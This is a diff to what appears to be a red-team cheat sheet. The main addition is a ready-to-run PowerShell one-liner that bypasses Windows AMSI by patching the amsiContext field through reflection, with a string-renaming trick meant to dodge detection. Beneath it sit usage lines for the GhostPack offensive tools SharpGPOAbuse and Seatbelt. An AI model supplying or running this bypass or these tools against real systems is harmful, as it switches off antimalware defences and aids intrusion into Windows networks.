@@ -1,3 +1,7 @@
+AMSI
+Change "*fuckery" to "*iUtils"
+$a=[Ref].Assembly.GetTypes();Start-Sleep -Seconds 1; Foreach($b in $a) {if ($b.Name -like "*fuckery") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
 GhostPack Tools
   SharpGPOAbuse.exe GPO modificatino tool
   Seatbelt.exe -group=all -full -outputfile="c:\windows\temp\out.txt"
